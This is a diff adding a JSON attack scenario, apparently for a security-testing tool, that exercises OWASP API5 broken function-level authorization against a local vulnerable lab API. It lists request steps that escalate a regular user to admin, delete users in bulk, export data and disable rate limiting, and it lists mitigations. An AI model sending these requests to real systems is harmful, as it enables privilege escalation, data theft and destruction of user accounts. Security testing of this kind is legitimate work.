@@ -1,0 +1,236 @@
+{
+  "id": "api5-function-level-authz-bypass",
+  "name": "API5:2023 - Broken Function Level Authorization",
+  "category": "API Security",
+  "difficulty": "Intermediate",
+  "description": "Exploits missing function-level authorization to access admin endpoints and perform privileged operations as a regular user",
+  "kind": "scenario",
+  "tags": [
+    "owasp-api-5",
+    "bfla",
+    "authorization",
+    "privilege-escalation",
+    "api"
+  ],
+  "target": "http://localhost:5000",
+  "estimatedDuration": "4-6 minutes",
+  "documentation": "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/",
+  "prerequisites": [
+    "VAmPI or vulnerable API with admin endpoints",
+    "Regular user credentials"
+  ],
+  "phases": [
+    {
+      "name": "reconnaissance",
+      "duration": 120,
+      "description": "Discover hidden admin endpoints and functions"
+    },
+    {
+      "name": "weaponization",
+      "duration": 180,
+      "description": "Craft requests to access privileged functions"
+    },
+    {
+      "name": "delivery",
+      "duration": 240,
+      "description": "Execute admin operations as regular user"
+    },
+    {
+      "name": "exploitation",
+      "duration": 300,
+      "description": "Perform unauthorized administrative actions"
+    }
+  ],
+  "attackVectors": [
+    {
+      "classification": "BrokenFunctionLevelAuthorization",
+      "severity": "High",
+      "owasp": "API5:2023 Broken Function Level Authorization"
+    },
+    {
+      "classification": "PrivilegeEscalation",
+      "severity": "Critical",
+      "cwe": "CWE-285: Improper Authorization"
+    }
+  ],
+  "expectedResults": {
+    "successCriteria": [
+      "Access to admin-only endpoints as regular user",
+      "HTTP 200 responses on privileged operations",
+      "Ability to delete or modify other users",
+      "Access to system configuration",
+      "Successful execution of bulk operations"
+    ],
+    "indicators": [
+      "No HTTP 403 (Forbidden) on admin endpoints",
+      "Debug information exposed to non-admin users",
+      "Successful user deletion without admin role",
+      "System settings modified by regular user",
+      "Bulk operations execute without privilege checks"
+    ]
+  },
+  "mitigations": [
+    "Implement role-based access control (RBAC) on all endpoints",
+    "Use centralized authorization logic (don't repeat in each endpoint)",
+    "Default deny - require explicit authorization for all operations",
+    "Validate user roles/permissions on server-side for every request",
+    "Use authorization frameworks (Casbin, OPA, Spring Security)",
+    "Regular security audits of endpoint access controls",
+    "Document which roles can access which endpoints",
+    "Implement automated tests for authorization",
+    "Log all access to administrative functions",
+    "Use API gateways with built-in authorization"
+  ],
+  "steps": [
+    {
+      "id": "create-regular-user",
+      "name": "Create regular unprivileged user account",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/createUser",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "regularuser",
+          "password": "password123",
+          "email": "regular@example.com"
+        }
+      }
+    },
+    {
+      "id": "regular-user-login",
+      "name": "Authenticate as regular user to get JWT",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "regularuser",
+          "password": "password123"
+        }
+      }
+    },
+    {
+      "id": "access-debug-endpoint",
+      "name": "Access admin debug endpoint without proper authorization check",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/users/v1/_debug",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "enumerate-hidden-endpoints",
+      "name": "Try common admin endpoint patterns",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "${ADMIN_PATH}",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "http-verb-tampering",
+      "name": "Try different HTTP verbs that might have weaker authorization",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "PUT",
+        "url": "/users/v1/${USERNAME}",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "username": "adminuser",
+          "admin": true,
+          "role": "administrator"
+        }
+      }
+    },
+    {
+      "id": "delete-other-users",
+      "name": "Attempt to delete other users without admin role",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "DELETE",
+        "url": "/users/v1/${USERNAME}",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "bulk-operations",
+      "name": "Try bulk admin operations that lack function-level checks",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/users/v1/bulk/delete",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "userIds": [
+            "1",
+            "2",
+            "3",
+            "4",
+            "5"
+          ]
+        }
+      }
+    },
+    {
+      "id": "export-sensitive-data",
+      "name": "Access data export functions reserved for admins",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/users/v1/export?format=${FORMAT}",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "system-configuration-access",
+      "name": "Access system configuration endpoints",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/config/settings",
+        "headers": {
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        }
+      }
+    },
+    {
+      "id": "modify-system-settings",
+      "name": "Modify system-wide settings without authorization",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "PUT",
+        "url": "/api/v1/config/settings",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer ${JWT_TOKEN}"
+        },
+        "body": {
+          "maintenance_mode": true,
+          "rate_limit_enabled": false
+        }
+      }
+    }
+  ]
+}
